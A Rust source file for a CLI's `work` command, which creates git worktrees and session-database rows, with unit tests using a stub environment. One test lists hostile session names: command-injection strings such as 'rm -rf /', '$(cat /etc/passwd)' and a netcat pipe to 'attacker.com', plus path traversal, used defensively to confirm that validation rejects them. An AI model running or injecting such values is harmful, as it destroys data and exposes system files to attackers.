//! Action functions for the work command handler (Tier 3).
//!
//! I/O operations that create/manage work sessions.
//!
//! `hd work <name>` creates a real session: a git worktree on a new branch
//! at `.scp/workspaces/<name>` plus a row in the session database
//! (`SCP_STATE_DB`, `SCP_DATABASE_PATH`, else `<cwd>/.scp/state.db` — the
//! same database `workspace query` reads). Earlier versions only printed
//! "Created session" and created nothing, which is why `query
//! session-exists`, `wait`, `focus`, `rename`, and `export` could never
//! find a session `work` had just claimed to create.
//!
//! The worktree/database effects go through [`WorkEnvironment`] so unit
//! tests can substitute a stub: running the real effects from a unit test
//! would create worktrees, branches, and database rows inside the checkout
//! the test suite itself runs in.

use scp_core::{output::Output, validation::domain::validate_session_name, Error, Result};

use super::data::{build_env_vars, generate_short_id, WorkMode, WorkOptions, WorkOutput};

/// The worktree + session-database effects of `hd work`, behind a seam
/// so tests never touch a real repo or database.
pub trait WorkEnvironment {
    /// Whether a session-database row with this name already exists.
    fn session_exists(&self, name: &str) -> Result<bool>;
    /// Whether the worktree directory or the branch already exists.
    fn workspace_exists(&self, name: &str, workspace_path: &str) -> Result<bool>;
    /// Create the worktree on a new branch at `workspace_path`.
    fn create_workspace(&self, name: &str, workspace_path: &str) -> Result<()>;
    /// Best-effort removal of a half-created worktree (used to roll back
    /// a session whose database registration failed).
    fn remove_workspace(&self, workspace_path: &str);
    /// Insert the session-database row for this session.
    fn register_session(&self, options: &WorkOptions, workspace_path: &str) -> Result<()>;
}

/// The real [`WorkEnvironment`]: git worktrees plus the session database.
pub struct RealWorkEnvironment;

impl RealWorkEnvironment {
    fn cwd() -> Result<std::path::PathBuf> {
        std::env::current_dir().map_err(|e| Error::io_error(format!("Failed to determine current directory: {e}")))
    }

    fn db_path() -> Result<std::path::PathBuf> {
        let cwd = Self::cwd()?;
        crate::commands::handlers::config_ports::resolve_state_db_path(&cwd)
    }

    fn block_on<T>(future: impl std::future::Future<Output = Result<T>>) -> Result<T> {
        let runtime = tokio::runtime::Runtime::new()
            .map_err(|e| Error::internal(format!("Failed to create runtime: {e}")))?;
        runtime.block_on(future)
    }
}

impl WorkEnvironment for RealWorkEnvironment {
    fn session_exists(&self, name: &str) -> Result<bool> {
        let db_path = Self::db_path()?;
        if !db_path.exists() {
            return Ok(false);
        }
        Self::block_on(async {
            use scp_core::infrastructure::database::{DatabaseConfig, SqliteDatabaseService};
            use scp_session::infrastructure::SqliteSessionRepository;

            let config = DatabaseConfig::new(db_path.to_string_lossy().to_string())?;
            let service = SqliteDatabaseService::new(config).await?;
            let repo = SqliteSessionRepository::new(service);
            repo.init_schema()
                .await
                .map_err(|e| Error::database(e.to_string()))?;
            let rows = repo
                .list_rows()
                .await
                .map_err(|e| Error::database(e.to_string()))?;
            Ok::<bool, Error>(rows.iter().any(|row| row.name == name))
        })
    }

    fn workspace_exists(&self, name: &str, workspace_path: &str) -> Result<bool> {
        let cwd = Self::cwd()?;
        if cwd.join(workspace_path).exists() {
            return Ok(true);
        }
        let output = std::process::Command::new("git")
            .args(["rev-parse", "--verify", "--quiet", name])
            .current_dir(&cwd)
            .output()
            .map_err(|e| Error::io_error(format!("Failed to run git: {e}")))?;
        Ok(output.status.success())
    }

    fn create_workspace(&self, name: &str, workspace_path: &str) -> Result<()> {
        let cwd = Self::cwd()?;
        let output = std::process::Command::new("git")
            .args(["worktree", "add", workspace_path, "-b", name])
            .current_dir(&cwd)
            .output()
            .map_err(|e| Error::io_error(format!("Failed to run git worktree add: {e}")))?;
        if !output.status.success() {
            return Err(Error::io_error(format!(
                "Failed to create workspace: {}",
                String::from_utf8_lossy(&output.stderr).trim()
            )));
        }
        Ok(())
    }

    fn remove_workspace(&self, workspace_path: &str) {
        if let Ok(cwd) = Self::cwd() {
            let _ = std::process::Command::new("git")
                .args(["worktree", "remove", "--force", workspace_path])
                .current_dir(&cwd)
                .output();
        }
    }

    fn register_session(&self, options: &WorkOptions, workspace_path: &str) -> Result<()> {
        let db_path = Self::db_path()?;
        let name = options.name.clone();
        let bead_id = options.bead_id.clone();
        let workspace_path = workspace_path.to_string();
        Self::block_on(async move {
            use scp_core::infrastructure::database::{DatabaseConfig, SqliteDatabaseService};
            use scp_session::{
                domain::{
                    entities::{BranchState, Session},
                    value_objects::{BeadId, SessionName, WorkspaceId},
                },
                infrastructure::{SessionRepository, SqliteSessionRepository},
            };

            if let Some(parent) = db_path.parent() {
                if !parent.as_os_str().is_empty() {
                    std::fs::create_dir_all(parent).map_err(|e| {
                        Error::io_error(format!("Failed to create {}: {e}", parent.display()))
                    })?;
                }
            }
            let config = DatabaseConfig::new(db_path.to_string_lossy().to_string())?;
            let service = SqliteDatabaseService::new(config).await?;
            let repo = SqliteSessionRepository::new(service);
            repo.init_schema()
                .await
                .map_err(|e| Error::database(e.to_string()))?;

            let session_name = SessionName::parse(&name)
                .map_err(|e| Error::validation_error(format!("Invalid session name: {e:?}")))?;
            let mut session = Session::create(session_name)
                .map_err(|e| Error::validation_error(format!("Invalid session: {e}")))?;
            session.workspace = Some(
                WorkspaceId::parse(&workspace_path)
                    .map_err(|e| Error::validation_error(format!("Invalid workspace: {e:?}")))?,
            );
            session.branch = BranchState::OnBranch {
                name: name.clone(),
            };
            // A bead id only survives into the row when it parses as a
            // bead id (`bd-<hex>`); `work --bead scp-123` style values are
            // still echoed in the command output, just not stored as a bead.
            session.bead = bead_id.and_then(|id| BeadId::parse(id).ok());
            repo.save(&session)
                .await
                .map_err(|e| Error::database(e.to_string()))?;
            Ok::<(), Error>(())
        })
    }
}

/// Execute the work command with the given options.
///
/// # Errors
///
/// Returns an error if the session name fails validation, if a session or
/// workspace with the name already exists (normal mode), or if creating
/// the worktree or the session row fails.
pub fn run_work(options: &WorkOptions) -> Result<()> {
    run_work_with_env(options, &RealWorkEnvironment)
}

/// [`run_work`] with an injectable environment (tests use a stub here so
/// no test ever creates a worktree, branch, or database row).
pub fn run_work_with_env(options: &WorkOptions, env: &dyn WorkEnvironment) -> Result<()> {
    validate_session_name(&options.name).map_err(|_| {
        Error::validation_error(format!("Invalid session name: '{}'", options.name))
    })?;

    match options.mode {
        WorkMode::DryRun => output_dry_run(options),
        WorkMode::Normal | WorkMode::Idempotent => execute_work(options, env),
    }
}

/// Build the agent ID: return None when `no_agent`, otherwise
/// use the provided ID or generate one.
fn resolve_agent_id(options: &WorkOptions) -> Result<Option<String>> {
    if options.no_agent {
        return Ok(None);
    }

    let agent_id = match &options.agent_id {
        Some(id) => Some(id.clone()),
        None => {
            let short_id = generate_short_id()
                .map_err(|e| Error::io_error(format!("Failed to generate agent ID: {e}")))?;
            Some(format!("agent-{short_id}"))
        }
    };

    Ok(agent_id)
}

/// Build a `WorkOutput` from the given options and resolved agent ID.
fn build_work_output(options: &WorkOptions, agent_id: Option<String>) -> Result<WorkOutput> {
    let workspace_path = format!(".scp/workspaces/{}", options.name);

    let env_vars = build_env_vars(
        &options.name,
        &workspace_path,
        agent_id.as_deref(),
        options.bead_id.as_deref(),
    );

    Ok(WorkOutput {
        name: options.name.clone(),
        workspace_path: workspace_path.clone(),
        created: matches!(options.mode, WorkMode::Normal),
        agent_id,
        bead_id: options.bead_id.clone(),
        env_vars,
        enter_command: format!("cd {workspace_path}"),
    })
}

/// Execute a normal or idempotent work command.
///
/// Normal mode fails when the session already exists; idempotent mode
/// reports the existing session instead of recreating it. On a
/// registration failure the just-created worktree is removed again, so a
/// failed `work` never leaves a half-created session behind.
fn execute_work(options: &WorkOptions, env: &dyn WorkEnvironment) -> Result<()> {
    let workspace_path = format!(".scp/workspaces/{}", options.name);
    let exists = env.session_exists(&options.name)?
        || env.workspace_exists(&options.name, &workspace_path)?;

    if exists {
        if matches!(options.mode, WorkMode::Idempotent) {
            let agent_id = resolve_agent_id(options)?;
            let mut output = build_work_output(options, agent_id)?;
            output.created = false;
            return output_result(&output);
        }
        return Err(Error::session_exists(options.name.clone()));
    }

    env.create_workspace(&options.name, &workspace_path)?;
    if let Err(error) = env.register_session(options, &workspace_path) {
        env.remove_workspace(&workspace_path);
        return Err(error);
    }

    let agent_id = resolve_agent_id(options)?;
    let output = build_work_output(options, agent_id)?;
    output_result(&output)
}

/// Output for dry run mode.
fn output_dry_run(options: &WorkOptions) -> Result<()> {
    let agent_id = resolve_agent_id(options)?;
    let workspace_path = format!(".scp/workspaces/{}", options.name);

    let env_vars = build_env_vars(&options.name, &workspace_path, None, None);

    let output = WorkOutput {
        name: options.name.clone(),
        workspace_path: workspace_path.clone(),
        created: false,
        agent_id,
        bead_id: options.bead_id.clone(),
        env_vars,
        enter_command: format!("cd {workspace_path}"),
    };

    print_dry_run_summary(options, &output)
}

/// Print the dry-run summary to stdout.
fn print_dry_run_summary(options: &WorkOptions, output: &WorkOutput) -> Result<()> {
    Output::info(&format!("[DRY RUN] Would create session '{}'", output.name));
    Output::info(&format!("  Workspace: {}", output.workspace_path));

    if let Some(ref bead) = options.bead_id {
        Output::info(&format!("  Bead: {bead}"));
    }

    Ok(())
}

/// Output the result to stdout.
fn output_result(output: &WorkOutput) -> Result<()> {
    let status = if output.created {
        "Created"
    } else {
        "Using existing"
    };
    Output::info(&format!("{status} session '{}'", output.name));
    Output::info(&format!("  Workspace: {}", output.workspace_path));

    if let Some(ref agent) = output.agent_id {
        Output::info(&format!("  Agent: {agent}"));
    }
    if let Some(ref bead) = output.bead_id {
        Output::info(&format!("  Bead: {bead}"));
    }

    Output::info("");
    Output::info("To enter workspace:");
    Output::info(&format!("  {}", output.enter_command));

    Ok(())
}

#[cfg(test)]
mod tests {
    use std::cell::RefCell;

    use scp_core::OutputFormat;

    use super::*;

    fn test_options(name: &str) -> WorkOptions {
        WorkOptions {
            name: name.to_string(),
            bead_id: None,
            agent_id: None,
            no_agent: false,
            mode: WorkMode::Normal,
            format: OutputFormat::Json,
        }
    }

    /// Stub environment: records effects, touches nothing on disk.
    struct StubEnv {
        exists: bool,
        fail_register: bool,
        calls: RefCell<Vec<String>>,
    }

    impl StubEnv {
        fn fresh() -> Self {
            Self {
                exists: false,
                fail_register: false,
                calls: RefCell::new(Vec::new()),
            }
        }
    }

    impl WorkEnvironment for StubEnv {
        fn session_exists(&self, _name: &str) -> Result<bool> {
            Ok(self.exists)
        }

        fn workspace_exists(&self, _name: &str, _workspace_path: &str) -> Result<bool> {
            Ok(self.exists)
        }

        fn create_workspace(&self, _name: &str, _workspace_path: &str) -> Result<()> {
            self.calls.borrow_mut().push("create".to_string());
            Ok(())
        }

        fn remove_workspace(&self, _workspace_path: &str) {
            self.calls.borrow_mut().push("remove".to_string());
        }

        fn register_session(&self, _options: &WorkOptions, _workspace_path: &str) -> Result<()> {
            self.calls.borrow_mut().push("register".to_string());
            if self.fail_register {
                return Err(Error::io_error("stub registration failure"));
            }
            Ok(())
        }
    }

    #[test]
    fn run_work_valid_name() {
        let options = test_options("my-session");
        let env = StubEnv::fresh();
        assert!(run_work_with_env(&options, &env).is_ok());
        assert_eq!(
            env.calls.borrow().as_slice(),
            ["create", "register"],
            "normal work creates the worktree and registers the session"
        );
    }

    #[test]
    fn run_work_dry_run() {
        let options = WorkOptions {
            name: "dry-session".to_string(),
            bead_id: None,
            agent_id: None,
            no_agent: false,
            mode: WorkMode::DryRun,
            format: OutputFormat::Json,
        };
        let env = StubEnv::fresh();
        assert!(run_work_with_env(&options, &env).is_ok());
        assert!(
            env.calls.borrow().is_empty(),
            "dry run must not create anything"
        );
    }

    #[test]
    fn run_work_rejects_empty_name() {
        let options = WorkOptions {
            name: String::new(),
            bead_id: None,
            agent_id: None,
            no_agent: false,
            mode: WorkMode::Normal,
            format: OutputFormat::Json,
        };
        let env = StubEnv::fresh();
        assert!(run_work_with_env(&options, &env).is_err());
    }

    #[test]
    fn run_work_rejects_shell_metacharacters() {
        let malicious_names = vec![
            "test;rm -rf /",
            "test$(cat /etc/passwd)",
            "test`whoami`",
            "test|nc attacker.com 4444",
            "../etc/passwd",
            "/etc/passwd",
            "test\0name",
        ];

        for name in malicious_names {
            let options = WorkOptions {
                name: name.to_string(),
                bead_id: None,
                agent_id: None,
                no_agent: false,
                mode: WorkMode::Normal,
                format: OutputFormat::Json,
            };
            let env = StubEnv::fresh();
            assert!(
                run_work_with_env(&options, &env).is_err(),
                "Should reject malicious name: {name}"
            );
        }
    }

    #[test]
    fn run_work_with_bead_id() {
        let options = WorkOptions {
            name: "bead-session".to_string(),
            bead_id: Some("scp-12345".to_string()),
            agent_id: None,
            no_agent: false,
            mode: WorkMode::Normal,
            format: OutputFormat::Json,
        };
        let env = StubEnv::fresh();
        assert!(run_work_with_env(&options, &env).is_ok());
    }

    #[test]
    fn run_work_no_agent() {
        let options = WorkOptions {
            name: "no-agent-session".to_string(),
            bead_id: None,
            agent_id: None,
            no_agent: true,
            mode: WorkMode::Normal,
            format: OutputFormat::Json,
        };
        let env = StubEnv::fresh();
        assert!(run_work_with_env(&options, &env).is_ok());
    }

    #[test]
    fn run_work_with_explicit_agent_id() {
        let options = WorkOptions {
            name: "agent-session".to_string(),
            bead_id: None,
            agent_id: Some("agent-custom".to_string()),
            no_agent: false,
            mode: WorkMode::Normal,
            format: OutputFormat::Json,
        };
        let env = StubEnv::fresh();
        assert!(run_work_with_env(&options, &env).is_ok());
    }

    #[test]
    fn run_work_accepts_valid_names() {
        let valid_names = vec![
            "workspace",
            "my-workspace",
            "my_workspace",
            "workspace123",
            "MyWorkspace",
            "FeatureBranch-123",
        ];

        for name in valid_names {
            let options = test_options(name);
            let env = StubEnv::fresh();
            assert!(
                run_work_with_env(&options, &env).is_ok(),
                "Should accept valid name: {name}"
            );
        }
    }

    #[test]
    fn output_dry_run_succeeds() {
        let options = WorkOptions {
            name: "dry-test".to_string(),
            bead_id: Some("bead-1".to_string()),
            agent_id: None,
            no_agent: false,
            mode: WorkMode::DryRun,
            format: OutputFormat::Json,
        };
        assert!(output_dry_run(&options).is_ok());
    }

    #[test]
    fn run_work_idempotent_mode() {
        let options = WorkOptions {
            name: "idem-session".to_string(),
            bead_id: None,
            agent_id: None,
            no_agent: false,
            mode: WorkMode::Idempotent,
            format: OutputFormat::Json,
        };
        let env = StubEnv::fresh();
        assert!(run_work_with_env(&options, &env).is_ok());
    }

    #[test]
    fn run_work_normal_mode_rejects_existing_session() {
        let options = test_options("taken-session");
        let env = StubEnv {
            exists: true,
            ..StubEnv::fresh()
        };
        assert!(run_work_with_env(&options, &env).is_err());
        assert!(
            env.calls.borrow().is_empty(),
            "existing session must not be recreated"
        );
    }

    #[test]
    fn run_work_idempotent_mode_reuses_existing_session() {
        let options = WorkOptions {
            name: "taken-session".to_string(),
            bead_id: None,
            agent_id: None,
            no_agent: false,
            mode: WorkMode::Idempotent,
            format: OutputFormat::Json,
        };
        let env = StubEnv {
            exists: true,
            ..StubEnv::fresh()
        };
        assert!(run_work_with_env(&options, &env).is_ok());
        assert!(
            env.calls.borrow().is_empty(),
            "idempotent reuse must not recreate anything"
        );
    }

    #[test]
    fn run_work_registration_failure_removes_worktree() {
        let options = test_options("half-session");
        let env = StubEnv {
            fail_register: true,
            ..StubEnv::fresh()
        };
        assert!(run_work_with_env(&options, &env).is_err());
        assert_eq!(
            env.calls.borrow().as_slice(),
            ["create", "register", "remove"],
            "a failed registration must roll back the worktree"
        );
    }
}
